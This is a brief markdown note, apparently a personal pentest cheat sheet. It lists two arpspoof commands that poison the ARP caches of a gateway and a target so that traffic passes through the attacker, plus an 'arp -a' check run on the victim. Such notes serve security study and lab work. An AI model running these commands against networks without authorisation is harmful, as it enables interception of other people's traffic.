# arp spoofing
```
arpspoof -i <interface> -t <gateway-ip> <target-ip>
arpspoof -i <interface> -t <target-ip> <gateway-ip>
```

# Verify on target machine
```
arp -a # works on windows and linux idk about mac
```